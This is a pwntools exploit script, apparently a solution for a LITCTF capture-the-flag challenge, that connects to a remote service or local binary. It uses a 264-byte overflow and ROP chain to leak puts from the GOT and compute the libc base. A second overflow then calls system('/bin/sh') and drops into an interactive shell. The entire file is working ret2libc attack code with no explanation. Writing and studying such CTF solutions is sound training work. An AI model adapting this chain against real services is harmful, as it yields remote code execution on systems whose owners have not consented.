#!/usr/bin/python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40121B

        c
        ''')
        input()


if args.REMOTE:
    p = remote('litctf.org', 31774)
else:
    p = process(exe.path)
GDB()
sla(b'puts', b'a'*264 + flat(0x0000000000401293,
    exe.got.puts, exe.plt.puts, exe.sym.main))
sla(b'puts', b'wan')
p.recvuntil(b'wan\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
info("libc: " + hex(libc.address))
sla(b'puts', b'a'*256 + flat(0x404a00,0x000000000040101a,0x0000000000401293,
    next(libc.search(b'/bin/sh')), libc.sym.system))
sla(b'puts', b'wan')

p.interactive()
